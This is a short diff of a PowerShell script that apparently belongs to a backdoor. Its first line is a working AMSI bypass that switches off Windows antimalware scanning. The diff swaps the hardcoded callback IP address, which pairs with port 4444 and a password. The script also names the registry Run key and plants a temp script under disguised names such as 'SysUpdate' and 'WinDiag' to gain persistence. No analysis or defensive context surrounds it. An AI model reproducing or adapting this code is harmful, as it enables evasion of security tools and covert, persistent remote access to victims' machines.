@@ -1,6 +1,6 @@
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-$ip = '192.168.12.204'; $port = 4444; $pass = "biskviti"
+$ip = '172.20.10.3'; $port = 4444; $pass = "biskviti"
 $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $regNames = @("SysUpdate", "WinDiag") 
 $scriptPath = "$env:TEMP\sysupd.ps1"
